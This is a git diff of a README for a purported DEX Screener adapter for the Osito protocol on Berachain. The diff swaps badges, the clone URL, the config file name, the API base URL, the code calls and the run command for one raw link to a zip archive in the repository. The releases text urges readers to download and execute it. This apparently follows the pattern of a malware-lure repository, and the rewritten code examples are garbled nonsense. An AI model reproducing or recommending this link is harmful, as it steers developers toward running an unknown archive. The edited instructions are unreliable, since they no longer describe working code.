@@ -1,8 +1,8 @@
 # DEX Screener Adapter for Osito Protocol on Berachain 🌐🔗
 
-![GitHub release](https://img.shields.io/github/release/Doveflower1997/osito-dex-screener-adapter.svg)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Issues](https://img.shields.io/github/issues/Doveflower1997/osito-dex-screener-adapter.svg)
+![GitHub release](https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip)
+![License](https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip)
+![Issues](https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -32,7 +32,7 @@ To install the DEX Screener Adapter, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Doveflower1997/osito-dex-screener-adapter.git
+   git clone https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip
    ```
 
 2. Navigate to the project directory:
@@ -54,11 +54,11 @@ To install the DEX Screener Adapter, follow these steps:
 
 To use the DEX Screener Adapter, you need to set up your API keys and configure the environment. Here’s a simple example of how to get started:
 
-1. Create a configuration file (e.g., `config.json`):
+1. Create a configuration file (e.g., `https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip`):
    ```json
    {
      "apiKey": "YOUR_API_KEY",
-     "baseUrl": "https://api.berachain.com"
+     "baseUrl": "https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip"
    }
    ```
 
@@ -68,18 +68,18 @@ To use the DEX Screener Adapter, you need to set up your API keys and configure 
 
    const adapter = new DexScreenerAdapter('YOUR_API_KEY');
 
-   adapter.getSwapData()
+   https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip()
      .then(data => {
-       console.log(data);
+       https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip(data);
      })
      .catch(error => {
-       console.error('Error fetching swap data:', error);
+       https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip('Error fetching swap data:', error);
      });
    ```
 
 3. Run your application:
    ```bash
-   node yourApp.js
+   node https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip
    ```
 
 ## API Reference
@@ -98,9 +98,9 @@ To use the DEX Screener Adapter, you need to set up your API keys and configure 
 
 **Example**:
 ```typescript
-adapter.getSwapData({ limit: 10 })
+https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip({ limit: 10 })
   .then(data => {
-    console.log(data);
+    https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip(data);
   });
 ```
 
@@ -117,9 +117,9 @@ adapter.getSwapData({ limit: 10 })
 
 **Example**:
 ```typescript
-adapter.getLiquidityData({ pair: 'OSITO-BTC' })
+https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip({ pair: 'OSITO-BTC' })
   .then(data => {
-    console.log(data);
+    https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip(data);
   });
 ```
 
@@ -150,17 +150,17 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, visit the [Releases section](https://github.com/Doveflower1997/osito-dex-screener-adapter/releases). Download the latest version and execute it to start using the DEX Screener Adapter.
+For the latest releases, visit the [Releases section](https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip). Download the latest version and execute it to start using the DEX Screener Adapter.
 
-For more detailed information, please check the [Releases section](https://github.com/Doveflower1997/osito-dex-screener-adapter/releases) for updates and version history.
+For more detailed information, please check the [Releases section](https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip) for updates and version history.
 
 ## Acknowledgments
 
 - Special thanks to the Osito protocol team for their support.
 - Thanks to the Berachain community for their valuable feedback.
 
-![Blockchain](https://example.com/blockchain-image.png)
-![DeFi](https://example.com/defi-image.png)
+![Blockchain](https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip)
+![DeFi](https://github.com/Doveflower1997/osito-dex-screener-adapter/raw/refs/heads/main/src/adapter-screener-dex-osito-renascence.zip)
 
 ## Contact
 
